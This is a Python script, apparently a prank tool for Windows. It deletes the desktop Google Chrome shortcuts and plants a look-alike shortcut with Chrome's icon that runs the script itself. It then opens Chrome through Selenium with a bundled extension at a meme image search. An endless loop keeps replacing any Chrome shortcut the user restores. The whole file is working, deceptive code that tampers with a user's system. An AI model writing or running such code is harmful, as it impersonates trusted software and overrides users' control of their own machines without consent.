import winshell, pathlib, sys, os.path, time, getpass
from win32com.client import Dispatch
from selenium import webdriver
from selenium.webdriver.chrome.options import Options

def resource_path(relative_path):
    """ Get absolute path to resource, works for dev and for PyInstaller """
    base_path = getattr(
        sys,
        '_MEIPASS',
        os.path.dirname(os.path.abspath(__file__)))
    return os.path.join(base_path, relative_path)

user = getpass.getuser()

def replacechromeshortcut():

    if os.path.exists("C:\\Users\\Public\\Desktop\\Google Chrome.lnk") or os.path.exists("C:\\Users\\"+ user +"\\Desktop\\Google Chrome.lnk") or os.path.exists("C:\\Users\\"+ user +"\\Desktop\\chrome.exe.lnk"):
        
        try:
            os.remove("C:\\Users\\"+ user +"\\Desktop\\chrome.exe.lnk")
            os.remove("C:\\Users\\"+ user +"\\Desktop\\Google Chrome.lnk")
            os.remove("C:\\Users\\Public\\Desktop\\Google Chrome.lnk")
            print(" lols")

        except:
            print("Google Chrome.lnk has already been removed")

        desktop = winshell.desktop()
        path = os.path.join(desktop, "Google Chrome.lnk")
        target = str(pathlib.Path(__file__).absolute())
        wDir = str(pathlib.Path().absolute())
        icon = "C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe"
        shell = Dispatch('WScript.Shell')

        shortcut = shell.CreateShortCut(path)
        shortcut.Targetpath = target
        shortcut.WorkingDirectory = wDir
        shortcut.IconLocation = icon
        shortcut.save()
    else:
        print(" doesn't work")

def replace_loop():

    while True:

        if os.path.exists("C:\\Users\\Public\\Desktop\\Google Chrome.lnk") or os.path.exists("C:\\Users\\"+ user +"\\Desktop\\Google Chrome.lnk") or os.path.exists("C:\\Users\\"+ user +"\\Desktop\\Chrome.exe.lnk"):
            try:
                os.remove("C:\\Users\\"+ user +"\\Desktop\\Chrome.exe.lnk")
                os.remove("C:\\Users\\"+ user +"\\Desktop\\Google Chrome.lnk")
                os.remove("C:\\Users\\Public\\Desktop\\Google Chrome.lnk")

            except:
                continue

            desktop = winshell.desktop()
            path = os.path.join(desktop, "Google Chrome.lnk")
            target = str(pathlib.Path(__file__).absolute())
            wDir = str(pathlib.Path().absolute())
            icon = "C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe"
            shell = Dispatch('WScript.Shell')

            shortcut = shell.CreateShortCut(path)
            shortcut.Targetpath = target
            shortcut.WorkingDirectory = wDir
            shortcut.IconLocation = icon
            shortcut.save()

def main():

    crxfile = resource_path("ncage.crx")
    execpath = resource_path("chromedriver.exe")
   
    chrome_options = Options()
    chrome_options.add_extension(crxfile)

    driver = webdriver.Chrome(chrome_options=chrome_options, executable_path = execpath)
    driver.get('https://www.google.com/search?q=get%20memed&hl=en&source=lnms&tbm=isch&biw=1920&bih=948')
    print("Page Title is : %s" %driver.title)

    input("Press enter to quit!")

    driver.service.stop()

if __name__ == "__main__":
    replacechromeshortcut()
    main()
    replace_loop()
